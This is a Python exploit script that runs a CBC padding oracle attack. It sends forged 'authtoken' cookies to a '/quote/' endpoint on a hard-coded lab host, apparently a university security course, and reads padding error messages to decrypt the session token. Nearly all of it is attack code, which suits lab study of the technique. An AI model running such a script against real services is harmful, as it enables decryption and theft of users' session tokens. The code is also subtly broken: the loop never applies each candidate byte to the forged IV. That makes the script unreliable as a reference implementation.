import sys
import requests
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES

def oracle(url, ciphertext):
    block_size = 16 # Block size is 16
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)] # Split the ciphertext into blocks
    result = b'' # Resulting plaintext
    iv = blocks[0] # IV is the first block
    for block in blocks[1:]: # Iterate over the blocks
        zero_iv = [0] * 16 # Create a zero IV
        for pad_val in range(1,block_size+1):
            padding_iv = [pad_val ^ b for b in zero_iv] # Create the padding IV
            
            for candidate in range(256): # Iterate over all possible values
                response = requests.get(f'{url}/quote/', cookies={'authtoken': (bytes(padding_iv) + block).hex()} )
                #response = requests.get(f'{url}/quote/', cookies={'authtoken': (bytes(padding_iv) + block).hex()}) #"No quote for you!" in response.text or 
                temp = None
                if response.text.__contains__("PKCS#7 padding is incorrect") or response.text.__contains__("Padding is incorrect."):
                    temp = False
                else:
                    temp = True
                if temp: # IF the padding is correct then we can break
                    if pad_val == 1:
                        # make sure the padding really is of length 1 by changing
                        # the penultimate block and querying the oracle again
                        padding_iv[-2] ^= 1 # change the penultimate byte
                        response = requests.get(f'{url}/quote/', cookies={'authtoken': (bytes(padding_iv) + block).hex()})
                        if response.text.__contains__("PKCS#7 padding is incorrect") or response.text.__contains__("Padding is incorrect."):
                            temp = False
                        else:
                            temp = True
                        if not temp:
                            continue  # false positive; keep searching
                    break
            else:
                raise Exception("no valid padding byte found (is the oracle working correctly?)")
            zero_iv[-pad_val] = candidate ^ pad_val # Update the zero IV
        pt = bytes(a ^ b for a,b in zip(iv,zero_iv)) # Calculate the plaintext
        result = result + pt # Add the plaintext to the result
        iv = block # Update the IV
    return result # Return the result

def main():
    BASE_URL = 'http://localhost:5000'
    BASE_URL = 'https://cbc-rsa.syssec.dk:8000/'
    cookie = requests.get(f'{BASE_URL}') # Get the cookie
    cookie_header = cookie.headers.get('Set-Cookie') # Get the cookie header
    authtoken = cookie_header.split('=')[1].split(';')[0] # Extract the authtoken
    res = oracle(f'{BASE_URL}',bytes.fromhex(authtoken)) # Call the oracle with the authtoken and run the padding oracle attack
    print(unpad(res,16))
    print("Recovered plaintext:", res)

if __name__ == '__main__':
    main()